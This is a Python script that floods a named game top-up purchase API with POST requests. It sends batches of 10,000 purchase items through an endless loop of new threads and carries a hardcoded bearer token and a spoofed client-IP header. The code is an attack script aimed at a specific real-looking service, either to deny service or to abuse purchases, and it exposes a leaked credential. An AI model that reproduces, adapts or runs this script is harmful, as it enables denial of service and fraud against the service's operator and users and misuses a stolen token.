import requests
import threading
import json

# Define the URL and headers
url = "https://manage.sha2topup.com/api/df4sgl225kgsdg84j0fsJQewe35r/v1/direct/purchase?rtert=3r"
headers = {
    "Host": "manage.sha2topup.com",
    "User-Agent": "0000",
    "Accept-Encoding": "gzip",
    "Authorization": "Bearer 879|ooc3WuP3lfXx4lhaR37SYgOpFNeETzuyuMzHO9FU35a25125",
    "X-Remote-IP": "127.0.0.2123123",
    "Content-Type": "application/json"
}

# Define the data payload
data = {
    "data": [
        {"userid": 12312312, "zoneid": 12, "product_code": "wp1"} for _ in range(10000)
    ]
}




# Function to send POST request
def send_post_request():
    try:
        response = requests.post(url, headers=headers, data=json.dumps(data))
        print(f"Status Code: {response.status_code}, Response: {response.text}")
        print(response.headers)
    except Exception as e:
        print(f"An error occurred: {e}")

# Number of threads
num_threads = 100

# List to hold the threads
threads = []

# Create and start threads
while True:
    thread = threading.Thread(target=send_post_request)
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()

print("All requests completed.")
